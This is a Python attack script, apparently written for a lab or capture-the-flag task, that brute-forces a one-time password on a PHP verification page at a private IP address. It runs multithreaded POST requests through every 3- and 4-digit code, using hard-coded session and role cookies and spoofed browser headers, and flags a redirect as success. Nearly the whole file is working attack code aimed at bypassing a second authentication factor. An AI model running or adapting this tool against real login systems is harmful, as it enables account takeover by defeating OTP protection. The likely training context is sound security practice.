#!/usr/bin/env python3

import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import time

# Configuration
TARGET_URL = "http://192.168.1.69:8080/src/verify_otp.php"
COOKIES = {
    'PHPSESSID': 'b1579b4a98f2228e113362cde648e094',
    'X-Role': 'YWRtaW4yMDI1MDYyNA==',
    'X-Session-Track': 'SGUp7aTbbas%3D',
    'X-User-Pref': 'ZGFya19tb2RlOjE7YWRzOm9mZg%3D%3D',
    'user_token': 'johnwayne_jiang%3A21%3A138%3A1JXPAWb'
}

HEADERS = {
    'Host': '192.168.1.69:8080',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.1.69:8080',
    'Connection': 'close',
    'Referer': 'http://192.168.1.69:8080/src/verify_otp.php',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

def try_otp(otp):
    """Try a single OTP value"""
    data = {'otp': str(otp)}
    
    try:
        response = requests.post(
            TARGET_URL, 
            data=data, 
            cookies=COOKIES, 
            headers=HEADERS,
            timeout=10,
            allow_redirects=False
        )
        
        # Check for success indicators
        if response.status_code == 302:  # Redirect (likely success)
            print(f"[SUCCESS] OTP {otp:03d} - Status: {response.status_code} - Location: {response.headers.get('Location', 'N/A')}")
            return otp
        elif "Invalid" not in response.text and "Error" not in response.text and "Wrong" not in response.text:
            print(f"[POTENTIAL] OTP {otp:03d} - Status: {response.status_code} - Response length: {len(response.text)}")
            print(f"Response preview: {response.text[:200]}...")
            return otp
        else:
            print(f"[FAIL] OTP {otp:03d} - Status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] OTP {otp:03d} - {e}")
    
    return None

def brute_force_otp_range(start, end, max_workers=10):
    """Brute force OTP in a given range"""
    print(f"Starting OTP brute force from {start:03d} to {end:03d}")
    print(f"Target: {TARGET_URL}")
    print(f"Using {max_workers} threads")
    print("-" * 50)
    
    successful_otps = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all OTP attempts
        future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(start, end + 1)}
        
        # Process results
        for future in future_to_otp:
            result = future.result()
            if result is not None:
                successful_otps.append(result)
    
    return successful_otps

def main():
    print("OTP Brute Force Script for Task 7")
    print("=" * 40)
    
    # Try common OTP ranges
    ranges_to_try = [
        (0, 999),      # 3-digit OTPs (000-999)
        (1000, 9999),  # 4-digit OTPs (1000-9999) - uncomment if needed
    ]
    
    all_successful = []
    
    for start, end in ranges_to_try:
        print(f"\nTrying range {start}-{end}...")
        successful = brute_force_otp_range(start, end, max_workers=20)
        all_successful.extend(successful)
        
        if successful:
            print(f"\n[FOUND] Successful OTP(s): {successful}")
            break  # Stop after finding success
    
    if all_successful:
        print(f"\n🎉 SUCCESS! Valid OTP(s) found: {all_successful}")
    else:
        print("\n❌ No valid OTP found in the tested ranges")

if __name__ == "__main__":
    main() 